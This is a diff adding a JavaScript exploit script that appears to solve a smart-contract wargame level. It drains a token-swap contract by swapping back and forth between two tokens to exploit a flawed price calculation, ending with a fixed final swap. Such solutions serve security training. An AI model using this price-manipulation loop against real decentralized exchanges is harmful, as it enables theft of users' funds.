@@ -1,0 +1,22 @@
+// final swap only requires 45 input tokens, less than balance by that time
+
+await contract.approve(instance, 10000)
+let token1 = await contract.token1()
+let token2 = await contract.token2()
+let swapFrom = token1
+let swapTo = token2
+let temp = null
+let amount = 10
+let i = 1
+while (true) { 
+    temp = swapFrom; 
+    await contract.swap(swapFrom,swapTo,amount); 
+    i++; 
+    swapFrom = swapTo; 
+    swapTo = temp; 
+    amount = await contract.balanceOf(swapFrom,player); 
+    if (i == 6) { 
+        await contract.swap(swapFrom,swapTo,45); 
+        break; 
+    } 
+}
